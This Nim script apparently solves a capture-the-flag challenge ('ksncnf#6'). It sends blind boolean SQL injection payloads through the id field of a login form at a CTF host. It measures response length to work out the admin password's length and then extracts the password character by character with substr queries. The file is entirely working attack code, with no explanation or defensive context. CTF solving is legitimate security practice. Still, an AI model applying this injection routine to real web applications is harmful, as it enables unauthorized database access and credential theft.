#Get the ksncnf#6 flag

import httpclient
import json
import strutils
import osproc

let client = newHttpClient()
var data = newMultipartData()
var flag = ""

proc httpReq(id:string,pass:string) :string =
  let client = newHttpClient()
  var data = newMultipartData()
  data["id"] = id
  data["pass"] = pass
  client.postContent("http://ctfq.sweetduet.info:10080/~q6/",multipart=data)

proc isSuccessRes(resData:string) :bool=
  len(resData) > 2000

proc getPwLen() :int =
  var pwLen = 0
  while not isSuccessRes(httpReq("admin' AND (SELECT length(pass) FROM user WHERE id='admin') = <len>; --".replace("<len>",intToStr(pwLen)),"")) :
    pwLen += 1 
  pwLen

proc atkpw(index:int) : char=
  for i in 48..123:
    var ch = char(i)
    var sch = ""
    sch.add(ch)
  
    var id = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), <index>, 1) = '<char>' ; --"
             .replace("<index>",intToStr(index))
             .replace("<char>",sch)

    var pw = "''"
    var data = httpReq(id,pw)

    if isSuccessRes(data):
      return ch

var pwLen = getPwLen()
echo "Password length is ", pwLen, "."
echo "Geting password..."
write(stdout,"Password is : ")

for i in 1..pwLen :
  write(stdout,atkpw(i))

echo "\nDone."
